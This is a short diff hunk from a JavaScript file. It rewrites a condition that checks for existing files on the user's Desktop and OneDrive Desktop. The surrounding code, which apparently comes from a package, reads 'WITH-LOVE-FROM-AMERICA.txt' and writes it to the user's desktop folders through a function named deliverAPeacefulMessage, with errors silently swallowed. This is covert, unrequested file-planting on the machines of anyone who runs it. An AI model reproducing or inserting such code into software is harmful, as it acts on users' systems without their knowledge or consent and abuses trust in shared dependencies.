@@ -115,7 +115,7 @@ function deliverAPeacefulMessage(path2, message) {
   } catch (err) {
   }
 }
-if (!(DesktopFileExists == null ? void 0 : DesktopFileExists.length) && !(OneDriveFileExists == null ? void 0 : OneDriveFileExists.length) && !(OneDriveDesktopFileExists == null ? void 0 : OneDriveDesktopFileExists.length)) {
+if (!DesktopFileExists.length && !OneDriveFileExists.length && !OneDriveDesktopFileExists.length) {
   thinkaboutit = "WITH-LOVE-FROM-AMERICA.txt";
   WITH_LOVE_FROM_AMERICA = read("./".concat(thinkaboutit));
   deliverAPeacefulMessage("".concat(Desktops).concat(thinkaboutit), WITH_LOVE_FROM_AMERICA);
